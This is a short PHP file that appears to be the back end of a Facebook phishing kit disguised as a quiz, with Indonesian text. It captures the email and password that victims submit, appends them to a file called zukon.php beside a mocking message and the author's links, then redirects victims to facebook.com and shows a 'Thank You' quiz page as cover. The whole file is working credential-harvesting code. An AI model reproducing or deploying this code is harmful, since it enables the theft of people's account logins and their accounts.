
<link href='bct.png' rel='icon' type='image/x-png'/>

<?php
header("Location: http://facebook.com/profil.php");
$ADEx = "zukon.php";
$ADEy = $_POST['email'];
$ADEz = $_POST['pass'];

$handle = fopen($ADEx, 'a');
fwrite($handle, "<a href='m.fb.com/zukon5566'>Sabar</a>");
fwrite($handle, "\n");
fwrite($handle, "<br>Email  :");
fwrite($handle, "\n");
fwrite($handle, "$ADEy");
fwrite($handle, "\n");
fwrite($handle, "<br>Kata Sandi :");
fwrite($handle, "\n");
fwrite($handle, "$ADEz");
fwrite($handle, "\n");
fwrite($handle, "<br> <a href='http://zukon.yu.tl'>Iklasin aja akun fb kamu.!</a>");
fwrite($handle, "\n");
fclose($handle);
exit;
?>

<?php
$random = rand(1000,5000);
?>
<title> Thank You ! </title>
<center> <h2> Selamat Anda Telah Mengikuti Quiz </h2><br>